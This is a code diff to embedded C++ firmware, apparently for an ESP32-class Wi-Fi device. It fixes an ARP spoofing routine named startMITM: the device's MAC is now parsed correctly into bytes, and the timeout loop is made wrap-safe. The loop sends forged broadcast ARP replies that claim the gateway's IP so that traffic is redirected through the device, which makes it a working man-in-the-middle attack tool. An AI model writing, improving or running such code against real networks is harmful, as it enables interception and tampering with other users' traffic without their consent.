@@ -2,6 +2,7 @@
 #include "tx_arm.h"
 #include <WiFi.h>
 #include <lwip/inet.h>
+#include "mac_utils.h"
 
 namespace ARPSpoof {
 
@@ -40,9 +41,18 @@ SpoofResult startMITM(const String &targetIP, const String &gatewayIP, uint16_t 
     Serial.println("Target: " + targetIP);
     Serial.println("Gateway: " + gatewayIP);
 
-    unsigned long startTime = millis();
+    uint8_t sourceMac[6] = {0};
+    String macStr = WiFi.macAddress();
+    if (!MacUtils::parse(macStr, sourceMac)) {
+        result.active = false;
+        result.packetsSent = 0;
+        return result;
+    }
 
-    while (millis() - startTime < timeoutMs && spoofing && TxArm::isArmed()) {
+    uint32_t startTime = millis();
+    uint32_t deadline = startTime + timeoutMs;
+
+    while ((int32_t)(millis() - deadline) < 0 && spoofing && TxArm::isArmed()) {
         ARPPacket pkt;
         memset(&pkt, 0, sizeof(pkt));
 
@@ -54,7 +64,7 @@ SpoofResult startMITM(const String &targetIP, const String &gatewayIP, uint16_t 
         pkt.opcode = htons(2);  // ARP reply
 
         memcpy(pkt.destMac, "\xff\xff\xff\xff\xff\xff", 6);
-        memcpy(pkt.sourceMac, WiFi.macAddress().c_str(), 6);
+        memcpy(pkt.sourceMac, sourceMac, 6);
 
         pkt.senderIP = gateway;
         pkt.targetIP = target;
